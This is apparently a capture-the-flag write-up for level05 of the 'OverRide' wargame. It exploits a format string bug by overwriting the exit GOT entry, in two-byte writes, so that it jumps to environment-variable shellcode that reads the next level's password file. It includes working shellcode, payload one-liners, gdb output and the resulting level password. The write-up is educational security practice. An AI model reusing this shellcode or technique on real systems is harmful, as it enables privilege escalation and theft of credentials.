Again, it's a string format exploit. 
We start by exporting our shellcode into an environment variable, we already used it quite a few times.

```bash
export SHELLCODE=`python -c 'print("\x90" * 30 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass")'`
```

We then check the address of the shellcode:

```assembly
(gdb) x/100x *environ
0xffffd790:	0x505f434c	0x52455041	0x5f72663d	0x552e5246
0xffffd7a0:	0x382d4654	0x5f434c00	0x52444441	0x3d535345
0xffffd7b0:	0x465f7266	0x54552e52	0x00382d46	0x4d5f434c
0xffffd7c0:	0x54454e4f	0x3d595241	0x465f7266	0x54552e52
0xffffd7d0:	0x00382d46	0x4c454853	0x444f434c	0x90903d45
0xffffd7e0:	0x90909090	0x90909090	0x90909090	0x90909090
[...]
```

And we use the exploit to see where our string can be found in the stack:

```bash
level05@OverRide:~$ cat <(python -c 'print("AAAA" + " %p " * 15)') | ./level05 
aaaa 0x64  0xf7fcfac0  0xf7ec3af9  0xffffd56f  0xffffd56e  (nil)  0xffffffff  0xffffd5f4  0xf7fdb000  0x61616161  0x20702520  0x20702520  0x20702520  0x20702520  0x20702520 
```

We check where we want to write the address of our environment variable :

```assembly
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   [...]
```

And we go for it : 

```bash
level05@OverRide:~$ cat <(python -c 'print("\xe0\x97\x04\x08" + "%4294957020x" + "%10$n" + " -> %10$p")') | ./level05 
�level05@OverRide:~$ 
```

There is an issue, and it's quite strange because it doesn't print anything....
And it doesn't work because `4294957020` is greater than int32_t max !
So we need to write 2 bytes by 2 bytes:

```bash
cat <(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55256x" + "%10$n" + "%10271x" + "%11$n")') | ./level05
[...]
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

```bash
su level6
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

